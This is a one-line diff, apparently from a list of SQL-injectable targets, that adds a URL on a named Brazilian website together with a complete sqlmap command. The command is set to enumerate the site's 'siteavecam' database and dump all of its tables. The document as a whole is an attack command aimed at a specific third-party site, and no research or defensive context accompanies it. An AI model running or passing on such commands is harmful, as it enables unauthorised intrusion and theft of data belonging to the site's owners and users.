@@ -1,0 +1,1 @@
+http://www.avecam.com.br/dica.php?id=11 (GET)  # sqlmap.py -u http://www.avecam.com.br/dica.php?id=11 -D siteavecam --tables --dump-all --threads 5 -v3
